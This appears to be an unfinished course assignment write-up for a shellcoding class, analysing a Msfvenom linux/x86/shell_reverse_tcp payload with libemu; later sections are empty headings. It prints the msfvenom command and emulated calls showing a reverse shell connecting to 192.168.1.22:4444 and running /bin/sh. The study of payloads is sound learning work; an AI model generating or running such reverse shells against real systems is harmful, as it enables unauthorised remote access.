# SLAE course
This course can be found here:
[Link to course](https://www.pentesteracademy.com/course?id=3)

## Assignment#5: What to do ?
For this assignment we have to:
* Take up to three shellcodes examples created by Msfvenom
* Use a disassembler like GDB/Ndisasm/Libemu to reverse them
* Present the analysis 

Now, let's get to work.
=

## linux/x86/shell_reverse_tcp
```console
#msfvenom -p linux/x86/shell_reverse_tcp -f raw | ./sctest -vvv -Ss 100000 -G reverse_shell.dot
#dot reverse_shell.dot -T png -o reverse_shell.png
```
Here is a graphical view:


C pseudo Code:
```console
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int dup2 (
     int oldfd = 14;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 14;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 14;
     int newfd = 0;
) =  0;
int connect (
     int sockfd = 14;
     struct sockaddr_in * serv_addr = 0x00416fbe => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 369207488 (host=192.168.1.22);
             };
             char sin_zero = "       ";
         };
     int addrlen = 102;
) =  0;
int execve (
     const char * dateiname = 0x00416fa6 => 
           = "//bin/sh";
     const char * argv[] = [
           = 0x00416f9e => 
               = 0x00416fa6 => 
                   = "//bin/sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
```
Assembly:

## Second shellcode
Graphical view:

C pseudo code:

Assembly:

linux/x86/shell_reverse_tcp (Version Staged)*
ELSE 
linux/x86/shell_bind_tcp
OR 
linux/x86/shell_bind_tcp (staged)


## linux/x86/meterpreter_reverse_tcp (stageless)
Graphical view:

C pseudo code:

Assembly: